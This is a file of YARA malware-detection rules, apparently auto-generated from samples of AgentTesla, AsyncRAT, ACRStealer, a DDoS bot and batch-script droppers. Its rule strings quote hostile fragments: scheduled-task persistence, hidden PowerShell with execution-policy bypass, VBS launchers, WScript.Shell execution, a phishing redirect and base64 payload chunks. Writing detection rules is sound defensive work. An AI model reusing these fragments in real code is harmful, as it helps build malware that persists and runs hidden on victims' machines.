rule AgentTesla_signature__b34f154ec913d2d2c435cbd644e91687_imphash_ {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_b34f154ec913d2d2c435cbd644e91687(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3d12a93fedb856d45fd4a3b410854b8926ad2dd79588c70910cf375751e30575"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s6 = "auspicate.exe" fullword wide /* score: '18.00'*/
      $s7 = "nstall System v3.02</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s8 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s9 = "buGr:\\p" fullword ascii /* score: '10.00'*/
      $s10 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s11 = "flippendes" fullword wide /* score: '8.00'*/
      $s12 = "saddelmagerarbejdernes" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule sig_9bc4968f4f0a3cd8d8de5dd1f8978670c0b21d03ea57a1fe59360ec20bce18be_9bc4968f {
   meta:
      description = "_subset_batch - file 9bc4968f4f0a3cd8d8de5dd1f8978670c0b21d03ea57a1fe59360ec20bce18be_9bc4968f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9bc4968f4f0a3cd8d8de5dd1f8978670c0b21d03ea57a1fe59360ec20bce18be"
   strings:
      $s1 = "hostfxr.dll" fullword wide /* score: '28.00'*/
      $s2 = "This executable is not bound to a managed DLL to execute. The binding value is: '%s'" fullword wide /* score: '25.00'*/
      $s3 = "Xeno - Executor UI" fullword wide /* score: '24.00'*/
      $s4 = ";http://crt.sectigo.com/SectigoPublicTimeStampingRootR46.p7c0#" fullword ascii /* score: '23.00'*/
      $s5 = "XenoUI.dll" fullword wide /* score: '23.00'*/
      $s6 = "D:\\a\\_work\\1\\s\\artifacts\\obj\\win-x64.Release\\corehost\\apphost\\standalone\\apphost.pdb" fullword ascii /* score: '22.00'*/
      $s7 = "The managed DLL bound to this executable is: '%s'" fullword wide /* score: '20.00'*/
      $s8 = ";http://crl.sectigo.com/SectigoPublicTimeStampingRootR46.crl0|" fullword ascii /* score: '19.00'*/
      $s9 = "Showing error dialog for application: '%s' - error code: 0x%x - url: '%s' - details: %s" fullword wide /* score: '19.00'*/
      $s10 = "Failed to resolve full path of the current executable [%s]" fullword wide /* score: '18.00'*/
      $s11 = "--- Invoked %s [version: %s] main = {" fullword wide /* score: '18.00'*/
      $s12 = "https://sectigo.com/CPS0" fullword ascii /* score: '17.00'*/
      $s13 = "https://go.microsoft.com/fwlink/?linkid=798306" fullword wide /* score: '17.00'*/
      $s14 = "The managed DLL bound to this executable could not be retrieved from the executable image." fullword wide /* score: '17.00'*/
      $s15 = "https://github.com/Riz-ve/Xeno" fullword wide /* score: '17.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      8 of them
}

rule a3__Logger_signature__c4b185fc6a9ca983e00f1684a13ef4e1_imphash_ {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_c4b185fc6a9ca983e00f1684a13ef4e1(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "db5b21e917debbedba1811f92e4a06a97cbd4ea1a1c836034fb7acef3a7f20cc"
   strings:
      $s1 = "LExecution of the Chakra scripting engine is blocked for Windows Script Host." fullword wide /* score: '24.00'*/
      $s2 = "                <requestedExecutionLevel level=\"asInvoker\" />" fullword ascii /* score: '15.00'*/
      $s3 = " DescriptionW" fullword ascii /* score: '10.00'*/
      $s4 = "       processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s5 = "    <description>Windows Based Script Host</description>" fullword ascii /* score: '10.00'*/
      $s6 = "vyfffff" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3e710578 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3e710578.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3e71057881c5dd0a97034bf0f018cc8b2e7daab4a45c7452d309359f6ac0d5b8"
   strings:
      $s1 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s2 = "mmp.exe" fullword wide /* score: '19.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      all of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__af9fecbe {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_af9fecbe.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "af9fecbef5a9cb1f1fdf251ae5d160190c8aece381d6dea27293e40b2d7aadbc"
   strings:
      $s1 = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" fullword wide /* score: '23.00'*/
      $s2 = "Stub.exe" fullword wide /* score: '22.00'*/
      $s3 = "\\Log.tmp" fullword wide /* score: '17.00'*/
      $s4 = "mhYyXi3FMCzUalOFGx21HhElW7VOF8uAVf46mDE3AavaTU0G4CZ7UMITO2lX8QJdGzeWRilsaiSIcqHPMo5HytxYu3P87NXWzjQOV4B6sKGVsxG8QnmcqZq5m0u4cVlr" wide /* score: '16.00'*/
      $s5 = "T0pyUWZpZGdtYVVlVldCck9yejhMUDVuWU1yemhTU1U=" fullword wide /* base64 encoded string 'OJrQfidgmaUeVWBrOrz8LP5nYMrzhSSU' */ /* score: '14.00'*/
      $s6 = "getscreen" fullword wide /* score: '13.00'*/
      $s7 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s8 = "passload" fullword wide /* score: '11.00'*/
      $s9 = "backproxy" fullword wide /* score: '11.00'*/
      $s10 = "DN3JgctuHENeqBTfDlGui+0/oTnhbaSgZfwoizmVXriedXVqPANYUCxERsNRIc5EOOfV3yOGlCi9j/3PoAAtwMrtftoMWJC2BaXkOB6waxzrHjPkutrhy2lPTejF8I9T" wide /* score: '10.00'*/
      $s11 = "\\Binance" fullword wide /* score: '10.00'*/
      $s12 = "gettxt" fullword wide /* score: '10.00'*/
      $s13 = "get_AsArray" fullword ascii /* score: '9.00'*/
      $s14 = "<HeaderSize>k__BackingField" fullword ascii /* score: '9.00'*/
      $s15 = "get_AsFloat" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule b2860589afa7f137b926525dfb2d9045_imphash_ {
   meta:
      description = "_subset_batch - file b2860589afa7f137b926525dfb2d9045(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "45bbca6548bd406df50cbdaad033cbbab3169d3cfde4410354060eb906653a18"
   strings:
      $x1 = "C:\\Users\\4674\\Documents\\GitHub\\NOTOCAR\\svchost\\svchost\\Release\\svchost.pdb" fullword ascii /* score: '34.00'*/
      $x2 = "C:\\Users\\4674\\Documents\\GitHub\\NOTOCAR\\Autorunvb6\\STC\\UpdaterCore\\Release\\UpdaterCore.pdb" fullword ascii /* score: '32.00'*/
      $s3 = "xmscoree.dll" fullword wide /* score: '23.00'*/
      $s4 = "httpbypass" fullword ascii /* score: '22.00'*/
      $s5 = "httppost" fullword ascii /* score: '16.00'*/
      $s6 = "httpflood" fullword ascii /* score: '16.00'*/
      $s7 = "\\client_bridge.exe" fullword wide /* score: '16.00'*/
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s9 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
      $s10 = "Admin required for !NTP-AMP, falling back to UDP flood on port 123." fullword ascii /* score: '12.00'*/
      $s11 = "Empty command" fullword ascii /* score: '12.00'*/
      $s12 = "Unknown command or invalid parameters." fullword ascii /* score: '12.00'*/
      $s13 = "GET / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s14 = "Admin required for !DNS-AMP, falling back to UDP flood on port 53." fullword ascii /* score: '12.00'*/
      $s15 = "bh/cKRuMP2ROXN4ShgTct6D07zLIC75Fz+E8VtXbfgxWiO8kXBgCFA3oy3skxWCpQDItrqKZlq4GKCSjr1W3TKC6JcgmkruUiPhWE3TrlhE/LMQ6V0uUn4zUxqRIkB+W" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule AtlasAgent_signature__85781b691fceb2a464ec7422966704d2_imphash_ {
   meta:
      description = "_subset_batch - file AtlasAgent(signature)_85781b691fceb2a464ec7422966704d2(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f3f0c87303fcc19aae446de0ff80560e09fdc1fc4b20b3dd442871b2544c5c7d"
   strings:
      $s1 = "curity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requeste" ascii /* score: '23.00'*/
      $s2 = "Project3.exe" fullword ascii /* score: '22.00'*/
      $s3 = "ProWeb.exe" fullword wide /* score: '22.00'*/
      $s4 = "Encrypted Pipeline Group" fullword wide /* score: '15.00'*/
      $s5 = " 2025 Encrypted Pipeline Group All rights reserved." fullword wide /* score: '15.00'*/
      $s6 = "GRuntime 0x0xC9AB56FB: authentication failed operation failed for HTTP3" fullword wide /* score: '14.00'*/
      $s7 = "hemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" fullword ascii /* score: '13.00'*/
      $s8 = "AError 0x0xB971C192: checksum mismatch operation failed for VAULT" fullword wide /* score: '12.00'*/
      $s9 = ";[0xD9468660] Configuration: DOCKER invalid parameter error" fullword wide /* score: '12.00'*/
      $s10 = "Provides Migrate Process capabilities" fullword wide /* score: '11.00'*/
      $s11 = "HSecurity 0x0xB061415F: authentication failed operation failed for HTTP3" fullword wide /* score: '11.00'*/
      $s12 = "JSecurity 0x0xF9016CBE: authentication failed operation failed for SANDBOX" fullword wide /* score: '11.00'*/
      $s13 = "KLtQ:\"SS" fullword ascii /* score: '10.00'*/
      $s14 = "8API 0xB4AD5425: connection timeout failure in WEBSOCKET" fullword wide /* score: '10.00'*/
      $s15 = "8[0x8DEF2FD9] Runtime: BLOCKNODE invalid parameter error" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 29000KB and
      8 of them
}

rule ACRStealer_signature__6720bed03c02ef8d006de5089c2e281b_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_6720bed03c02ef8d006de5089c2e281b(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "262fb3c3eec7ffa0ff482419ee64c6c45a16e7f7d7fcca7d38e608c11a24758b"
   strings:
      $s1 = ";http://crt.sectigo.com/SectigoPublicTimeStampingRootR46.p7c0#" fullword ascii /* score: '23.00'*/
      $s2 = "bthprops.dll" fullword wide /* score: '23.00'*/
      $s3 = "irprops.dll" fullword wide /* score: '23.00'*/
      $s4 = "inet_SessionExecute" fullword ascii /* score: '21.00'*/
      $s5 = "ies_Netw.dll" fullword wide /* score: '20.00'*/
      $s6 = ";http://crl.sectigo.com/SectigoPublicTimeStampingRootR46.crl0|" fullword ascii /* score: '19.00'*/
      $s7 = ":http://crl.sectigo.com/SectigoPublicCodeSigningRootR46.crl0{" fullword ascii /* score: '19.00'*/
      $s8 = ":http://crt.sectigo.com/SectigoPublicCodeSigningRootR46.p7c0#" fullword ascii /* score: '19.00'*/
      $s9 = "https://sectigo.com/CPS0" fullword ascii /* score: '17.00'*/
      $s10 = "The connection was rejected by the target device" fullword wide /* score: '17.00'*/
      $s11 = "9http://crl.sectigo.com/SectigoPublicTimeStampingCAR36.crl0z" fullword ascii /* score: '16.00'*/
      $s12 = "?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl05" fullword ascii /* score: '16.00'*/
      $s13 = "9http://crt.sectigo.com/SectigoPublicTimeStampingCAR36.crt0#" fullword ascii /* score: '16.00'*/
      $s14 = "2http://crl.comodoca.com/AAACertificateServices.crl04" fullword ascii /* score: '16.00'*/
      $s15 = "8http://crt.sectigo.com/SectigoPublicCodeSigningCAR36.crt0#" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      8 of them
}

rule sig_9a63a77e2604dd73cde4fb8e02af3d8416f49dca635ecab80b31a3e1a4dd4a7b_9a63a77e {
   meta:
      description = "_subset_batch - file 9a63a77e2604dd73cde4fb8e02af3d8416f49dca635ecab80b31a3e1a4dd4a7b_9a63a77e.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9a63a77e2604dd73cde4fb8e02af3d8416f49dca635ecab80b31a3e1a4dd4a7b"
   strings:
      $s1 = "    document.getElementById('frame').src = url+\"/page_blocked_ng.html?reason=\"+reason[0]+\"&source=\"+encodeURIComponent(windo" ascii /* score: '13.00'*/
      $s2 = "var url=\"https://connect.bitdefender.net\";" fullword ascii /* score: '10.00'*/
      $s3 = "    document.getElementById('frame').src = url+\"/page_blocked_ng.html?reason=\"+reason[0]+\"&source=\"+encodeURIComponent(windo" ascii /* score: '9.00'*/
      $s4 = "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 2KB and
      all of them
}

rule a24a6d09d763879a0794bf82f10ebdd036bf63775623342a6ba511119696eff9_a24a6d09 {
   meta:
      description = "_subset_batch - file a24a6d09d763879a0794bf82f10ebdd036bf63775623342a6ba511119696eff9_a24a6d09.html"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a24a6d09d763879a0794bf82f10ebdd036bf63775623342a6ba511119696eff9"
   strings:
      $s1 = "<script type=\"text/javascript\"> (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.crea" ascii /* score: '21.00'*/
      $s2 = "Element(r);t.async=1;t.src=\"https://www.clarity.ms/tag/\"+i; y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y); })(" ascii /* score: '15.00'*/
      $s3 = "        @import url('https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Noto+Sans+Arabic:wght@400;500;700&displa" ascii /* score: '15.00'*/
      $s4 = "        @import url('https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Noto+Sans+Arabic:wght@400;500;700&displa" ascii /* score: '15.00'*/
      $s5 = "        /* --- Main Content Structure --- */" fullword ascii /* score: '14.00'*/
      $s6 = "            --primary-color: #b71c1c; /* Strong, authoritative red for key elements */" fullword ascii /* score: '13.00'*/
      $s7 = "    <!-- MathJax for LaTeX Rendering -->" fullword ascii /* score: '12.00'*/
      $s8 = "ndow, document, \"clarity\", \"script\", \"sml4kreu9y\"); </script>" fullword ascii /* score: '10.00'*/
      $s9 = "<script type=\"text/javascript\"> (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.crea" ascii /* score: '10.00'*/
      $s10 = "    <meta name=\"description\" content=\"" fullword ascii /* score: '10.00'*/
      $s11 = "        /* --- Math & Code Styling --- */" fullword ascii /* score: '9.00'*/
      $s12 = ": ${getPopulationContext(totalParticipants)}" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 70KB and
      8 of them
}

rule a3a7b641f95250b31821fa0f6de589d4687c0a6cb4071f6bc81280196e9c232d_a3a7b641 {
   meta:
      description = "_subset_batch - file a3a7b641f95250b31821fa0f6de589d4687c0a6cb4071f6bc81280196e9c232d_a3a7b641.html"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a3a7b641f95250b31821fa0f6de589d4687c0a6cb4071f6bc81280196e9c232d"
   strings:
      $s1 = "  <meta http-equiv=\"refresh\" content=\"0;url=https://boletoclientevp.anexodocumentos.com/\" />" fullword ascii /* score: '22.00'*/
      $s2 = "  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 1KB and
      all of them
}

rule AgentTesla_signature__2 {
   meta:
      description = "_subset_batch - file AgentTesla(signature).hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "15df0d47c3812602e0d88f14f9dc5c3387abe48068c6b6212a6e572ad58b07b9"
   strings:
      $s1 = "function aggerating(printTicket, scriptContext, devModeProperties) {" fullword ascii /* score: '13.00'*/
      $s2 = "penashe.Run(monoplanes, 0, false);" fullword ascii /* score: '13.00'*/
      $s3 = "function farted(devModeProperties, scriptContext, printTicket) {" fullword ascii /* score: '13.00'*/
      $s4 = "var penashe = new ActiveXObject(\"WScript.Shell\");" fullword ascii /* score: '12.00'*/
      $s5 = "        var phalloidin = getParameterDefs(scriptContext);" fullword ascii /* score: '10.00'*/
      $s6 = "function peccation(printTicket, scriptContext, printCapabilities) {" fullword ascii /* score: '9.00'*/
      $s7 = "ot circuiting the rest of the code." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 100KB and
      all of them
}

rule sig_9ab5e1ccff616db6e9a7d571b1d932953abadf85a489194827aee8326e436b12_9ab5e1cc {
   meta:
      description = "_subset_batch - file 9ab5e1ccff616db6e9a7d571b1d932953abadf85a489194827aee8326e436b12_9ab5e1cc.dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9ab5e1ccff616db6e9a7d571b1d932953abadf85a489194827aee8326e436b12"
   strings:
      $s1 = "F:\\HOOK\\MyTestAutomator_src\\MyTestAutomator_src\\HookDLL\\Release\\HookDLL.pdb" fullword ascii /* score: '24.00'*/
      $s2 = "HookDLL.dll" fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule sig_9ad406a66395d7751a0c782486d27bcdcdc470793873253d0254ecc7a5c13974_9ad406a6 {
   meta:
      description = "_subset_batch - file 9ad406a66395d7751a0c782486d27bcdcdc470793873253d0254ecc7a5c13974_9ad406a6.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9ad406a66395d7751a0c782486d27bcdcdc470793873253d0254ecc7a5c13974"
   strings:
      $x1 = "powershell -NoProfile -ExecutionPolicy Bypass -Command ^" fullword ascii /* score: '41.00'*/
      $s2 = ">>\"!vbs!\" echo s.Run \"powershell -ex Bypass -WindowStyle Hidden -File \"\"!ps1!\"\"\", 0, False" fullword ascii /* score: '27.00'*/
      $s3 = "vWmhETFBSS0ZBVmdKWFpDa0NGQ1lxRFYyemR3aDhrdllaTU0xSmo1b1c0a0ovNE0vSmFuSnY0YmFlRGFLcVBXZEVJSjRFaWdSMG9CZE1MMnRiSytKT2dwb1l5NzBBY2N" ascii /* base64 encoded string 'ZhDLPRKFAVgJXZCkCFCYqDV2zdwh8kvYZMM1Jj5oW4kJ/4M/JanJv4baeDaKqPWdEIJ4EigR0oBdML2tbK+JOgpoYy70Acc' */ /* score: '26.00'*/
      $s4 = "id2hjd2N5VVNBbzY5d2swbnVaazNFSGluVmQ0d0JvRjF5SlJ6Rk1YTGVHRlpNM1JKS09sb0RNSlJsTG1iZitidGpjWkZIL2xjUlRRcUNCUnJCRjNHRGRIQWNZTDlLRjR" ascii /* base64 encoded string 'whcwcyUSAo69wk0nuZk3EHinVd4wBoF1yJRzFMXLeGFZM3RJKOloDMJRlLmbf+btjcZFH/lcRTQqCBRrBF3GDdHAcYL9KF4' */ /* score: '26.00'*/
      $s5 = "LTkpVRC9wNm5VMmxBK2lCcnI5d0Fndmk0dEduNkNUMkE4amFJUTN3elpmSzRqWFNiT1BtRmFLdUI5a0NKMGtHdFdJR2J3R3VHMS84R2RRdnF4dDFwU3BvYjQxRzB3dDl" ascii /* base64 encoded string 'NJUD/p6nU2lA+iBrr9wAgvi4tGn6CT2A8jaIQ3wzZfK4jXSbOPmFaKuB9kCJ0kGtWIGbwGuG1/8GdQvqxt1pSpob41G0wt9' */ /* score: '25.00'*/
      $s6 = "set \"vbs=%TEMP%\\audiocodecs!RANDOM!.vbs\"" fullword ascii /* score: '22.00'*/
      $s7 = "START cmd /c \"echo Message expired, check your voicemail or expect new download link soon && echo Press any key to exit... && p" ascii /* score: '22.00'*/
      $s8 = "START cmd /c \"echo Message expired, check your voicemail or expect new download link soon && echo Press any key to exit... && p" ascii /* score: '22.00'*/
      $s9 = "XaDNDM3hIOEhXODBaTTdRWWYyNDl2RzRkdlJiN2RPaEFlUUR5amhDUUY1L3JuLzQvQmwybWpHZkQ1d29lcUxNZzMzTnhZelRCN3lzYTNEb3l5MHdCWlBIeG1Sa0Q5djl" ascii /* base64 encoded string 'h3C3xH8HW80ZM7QYf249vG4dvRb7dOhAeQDyjhCQF5/rn/4/Bl2mjGfD5woeqLMg33NxYzTB7ysa3Doyy0wBZPHxmRkD9v9' */ /* score: '21.00'*/
      $s10 = "5RlJvMlRsV1FubHlvOVUvRHo5K25scFZxRFE1M2hFT2dFc3htL2J6QWthcnJJaG1jckw0cDZhTENVWjVzTjQzUU9qWUZUMGgvdDh4TmxBeWNVQ2lWTE5RM08vWDh2MTZ" ascii /* base64 encoded string 'FRo2TlWQnlyo9U/Dz9+nlpVqDQ53hEOgEsxm/bzAkarrIhmcrL4p6aLCUZ5sN43QOjYFT0h/t8xNlAycUCiVLNQ3O/X8v16' */ /* score: '21.00'*/
      $s11 = "hR01ZMWlpK2k1SzlldTJ3TGhTNEREc2NlK0FWYUtqTW5DRENTaTFzNUoxZFJoeUgxbmdPRE1Ka3F5ZG85QXBuTWE2aHJhRTFkQTJ3dU1rSkJqWGkzeXdtRWpVUU51S1o" ascii /* base64 encoded string 'GMY1ii+i5K9eu2wLhS4DDsce+AVaKjMnCDCSi1s5J1dRhyH1ngODMJkqydo9ApnMa6hraE1dA2wuMkJBjXi3ywmEjUQNuKZ' */ /* score: '21.00'*/
      $s12 = "Yck43WVV4eld4Zk5ubTBJNHJrVHpZVWhGL2pKN04vOUpZSXl3bTRNSGk2dEZsc3VPTDBIcCtkTHE5ZitrUHdXeHZzdUhqRDY2SHVZR1ZhTGhvdVk0dzVJMHEvSCtKbGJ" ascii /* base64 encoded string 'rN7YUxzWxfNnm0I4rkTzYUhF/jJ7N/9JYIywm4MHi6tFlsuOL0Hp+dLq9f+kPwWxvsuHjD66HuYGVaLhouY4w5I0q/H+Jlb' */ /* score: '21.00'*/
      $s13 = "GUy9vRTJiUkhBZkJUK2szTHloRVpDWWdEbk1lbEZENTdZMEd2cnRFSjh1RkdMRk1kZkV2R2ZyU1hVQXFKRi80SU5qRWM1aVhmSmZabHFsL3hDUWI4dzk0SmhFZUNkY1R" ascii /* base64 encoded string 'S/oE2bRHAfBT+k3LyhEZCYgDnMelFD57Y0GvrtEJ8uFGLFMdfEvGfrSXUAqJF/4INjEc5iXfJfZlql/xCQb8w94JhEeCdcT' */ /* score: '21.00'*/
      $s14 = "tdGJTUzVpQnFKZ1JHWXlTWWhxU2RYWXJWQlRyQ1hrZzlJbW9tZzAzd3FHU2w0VzY0b3JDdHF1d3JHcHZlWDZIUkltc25rUGltZVB5bUluK0szZW9oNFBNUDVScXovVU9" ascii /* base64 encoded string 'tbSS5iBqJgRGYySYhqSdXYrVBTrCXkg9Imomg03wqGSl4W64orCtquwrGpveX6HRImsnkPimePymIn+K3eoh4PMP5Rqz/UO' */ /* score: '21.00'*/
      $s15 = "ObkdwQjdHNWFUUW00OVBmckRQTVQ1WWNSenJZWmdpUFFxQi92bkJDRVdIdExLQjNUakRWMER1a20zOVJueUE5TVd1TlRpbXpIWGV1TEZzaENPK1lqamdENGJyMmZLUVp" ascii /* base64 encoded string 'nGpB7G5aTQm49PfrDPMT5YcRzrYZgiPQqB/vnBCEWHtLKB3TjDV0Dukm39RnyA9MWuNTimzHXeuLFshCO+YjjgD4br2fKQZ' */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule a8a94e0b4121edf4df9a6453743203286433cc22d0c7f5671523abec0bb2a40b_a8a94e0b {
   meta:
      description = "_subset_batch - file a8a94e0b4121edf4df9a6453743203286433cc22d0c7f5671523abec0bb2a40b_a8a94e0b.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a8a94e0b4121edf4df9a6453743203286433cc22d0c7f5671523abec0bb2a40b"
   strings:
      $x1 = "powershell -NoProfile -ExecutionPolicy Bypass -Command ^" fullword ascii /* score: '41.00'*/
      $s2 = ">>\"!vbs!\" echo s.Run \"powershell -ex Bypass -WindowStyle Hidden -File \"\"!ps1!\"\"\", 0, False" fullword ascii /* score: '27.00'*/
      $s3 = "Wd2lJaHJTZEFJck14TGdyN0EyR0s0aVpBQWxDYmRlbm1sSWZEUytJUXZaSjRZU2xGMVFMUlFPS1ZUUlFDNEdhZzRrbk5vU3IrcFFJbXJmZHo4cGFSeTIrNWVQSVkyR0J" ascii /* base64 encoded string 'wiIhrSdAIrMxLgr7A2GK4iZAAlCbdenmlIfDS+IQvZJ4YSlF1QLRQOKVTRQC4Gag4knNoSr+pQImrfdz8paRy2+5ePIY2GB' */ /* score: '26.00'*/
      $s4 = "3ZGF4K0JTQ3E4OGkzOUV5emorUm8vUFRBM0tzNSswaGdqbkdySUxKamd2MmpRdk9CUXM1VWE1L3VDSDlla2V5Z1g5dVNPNDh5Mzd3WEpET01ZZ0p5WVpKYkJoS1JnSXp" ascii /* base64 encoded string 'dax+BSCq88i39Eyzj+Ro/PTA3Ks5+0hgjnGrILJjgv2jQvOBQs5Ua5/uCH9ekeygX9uSO48y37wXJDOMYgJyYZJbBhKRgIz' */ /* score: '26.00'*/
      $s5 = "set \"vbs=%TEMP%\\cert!RANDOM!.vbs\"" fullword ascii /* score: '22.00'*/
      $s6 = "hbXJqKy9VQ3ZGNEVrd0w0eFhVb3cwa29ZSjVIQTkwUXhURWppaFYyNUQvNDdNbVhoZllSVWdiS2I1bXBLemJXbWxXR1phVTJ3L2tWd2pjME9wWWZUU3liUndFMlRiSEN" ascii /* base64 encoded string 'mrj+/UCvF4EkwL4xXUow0koYJ5HA90QxTEjihV25D/47MmXhfYRUgbKb5mpKzbWmlWGZaU2w/kVwjc0OpYfTSybRwE2TbHC' */ /* score: '21.00'*/
      $s7 = "zVWFHQkN2M0JDKzEvcHB5L1paNEdmWGEzWHJ6RGJWYW1PZ3RWVm9BdnJrK2I2M05rdEk2Mmh1cXNrUXVNZTFyQlRWZm9hWGF5cmJTK245Mml2blZiTnhxalU1ejJldGV" ascii /* base64 encoded string 'UaGBCv3BC+1/ppy/ZZ4GfXa3XrzDbVamOgtVVoAvrk+b63NktI62huqskQuMe1rBTVfoaXayrbS+n92ivnVbNxqjU5z2ete' */ /* score: '21.00'*/
      $s8 = "Vb0RYZy90b0JoTTRGaDNscDRaUXR3VCtsWlJkWlR4blR6UUlwOVR6dm90LzlaS0JSVVNhVjgxbk9GQ0tMMkxNYyswRk9WM004VXFvS2gyL1NkQk52b0JvanljOU1MYnZ" ascii /* base64 encoded string 'oDXg/toBhM4Fh3lp4ZQtwT+lZRdZTxnTzQIp9Tzvot/9ZKBRUSaV81nOFCKL2LMc+0FOV3M8UqoKh2/SdBNvoBojyc9MLbv' */ /* score: '21.00'*/
      $s9 = "ZaHovWW53OFVtQ254d0lPNjBmdlQwN2dyUjd4YWM4S3d5Y1dPQWh0MDRDekI3bzRSTkJaeE9uenBUVkRLWlZ6ajkxWjNuaEFKK3g1SGpEblBVTFlBYlU0ZFM3cEU0QlV" ascii /* base64 encoded string 'hz/Ynw8UmCnxwIO60fvT07grR7xac8KwycWOAht04CzB7o4RNBZxOnzpTVDKZVzj91Z3nhAJ+x5HjDnPULYAbU4dS7pE4BU' */ /* score: '21.00'*/
